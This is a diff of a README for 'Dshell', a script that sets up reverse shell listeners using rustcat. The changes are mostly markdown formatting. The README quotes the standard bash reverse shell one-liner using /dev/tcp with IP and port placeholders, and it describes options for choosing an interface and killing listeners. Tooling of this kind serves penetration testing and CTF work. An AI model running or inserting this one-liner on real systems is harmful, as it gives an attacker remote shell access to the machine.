@@ -1,28 +1,32 @@
-## Dshell
+# Dshell
 
 > "A reverse shell shows that true control comes when the target reaches back willingly."
 
+<br>
+
 **Dshell** is a reverse shell script that prepares a responsive shell on a specified port using [rustcat](https://github.com/robiot/rustcat).
 
----
+<br><br>
 
-### Features
+## Features
 
 * Quickly set up a reverse shell listener.
 * Kill running Dshell processes on demand.
 * Supports multiple network interfaces by default.
 
----
+<br><br>
 
-### Installation
+## Installation
 
 Ensure [rustcat](https://github.com/robiot/rustcat) is installed on your system.
 
----
+<br><br>
 
-### Usage
+## Usage
 
-#### Help Menu
+<br>
+
+### Help Menu
 
 ```sh
 dshell -h
@@ -31,14 +35,15 @@ dshell -h
     /usr/local/bin/dshell -p <PORT> [IFACE|IP]
     /usr/local/bin/dshell -k <PORT|all>
 ```
+<br><br>
 
----
-
-#### Run a Listener
+### Run a Listener
 
 ```sh
 dshell -p <PORT> [IFACE|IP]
 ```
+
+<br>
 
 Dshell will output the most commonly used reverse shell `bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'` with the supplied IP and PORT
 If no interface or IP is supplied, Dshell will try the following interfaces in order:
@@ -49,9 +54,9 @@ If no interface or IP is supplied, Dshell will try the following interfaces in o
 * `eth0`
 * `lo`
 
----
+<br><br>
 
-#### Kill Running Processes
+### Kill Running Processes
 
 ```sh
 dshell -k <PORT|all>
@@ -60,9 +65,9 @@ dshell -k <PORT|all>
 * `<PORT>` 		– Kill Dshell process running on a specific port.
 * `all` 		– Kill all Dshell processes.
 
----
+<br><br>
 
-#### Examples
+### Examples
 
 Start a listener on port `4444` using `tun0` interface:
 
